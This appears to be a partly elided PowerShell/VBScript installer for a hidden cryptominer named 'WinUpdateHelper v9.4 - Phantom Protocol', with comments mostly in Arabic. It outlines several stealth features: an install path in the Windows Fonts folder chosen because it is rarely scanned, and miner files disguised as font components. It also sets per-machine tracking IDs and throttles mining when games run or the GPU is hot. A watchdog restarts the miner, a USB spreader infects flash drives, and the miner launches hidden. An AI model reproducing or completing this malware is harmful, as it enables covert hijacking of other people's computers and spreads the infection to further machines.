# === WinUpdateHelper v9.4 - Phantom Protocol ===
# Multi-Vector Persistence | Temp-Adaptive Throttling | Process Watchdog | USB Spreader
...
# 2. مسار التثبيت — Microsoft\Windows\Fonts (نادر المسح)
...
# 3. كتابة الكونفيغ الموحّد (3 بّولات — TLS + Fallback TCP)
$configJson = @'
{
  "pools": [
...
# 4. معرف فريد للجهاز (لتتبع العقد)
...
' --- كشف الألعاب (قائمة عمليات حقيقية) ---
...
' --- استعلام درجة حرارة GPU عبر WMI ---
Function GetGPUTemp()
...
Do
    ...
    ' استدعاء الووتش دوغ كل 30 دورة (~150 ثانية)
...
# ========== 6. Watchdog — يعيد الماينر لو انقتل ==========
$watchdogContent = @'
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
$vbsPath = Join-Path $fontDir "font_loader.vbs"
$minerPath = Join-Path $fontDir "msft_font_cache.exe"
...
# ========== 9. USB Spreader (اختياري — يزرع نفسه في الفلاشات) ==========
...
# ========== 10. بدء التشغيل الفوري ==========
Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden

# ========== 11. تشغيل الووتش دوغ أول مرة ==========
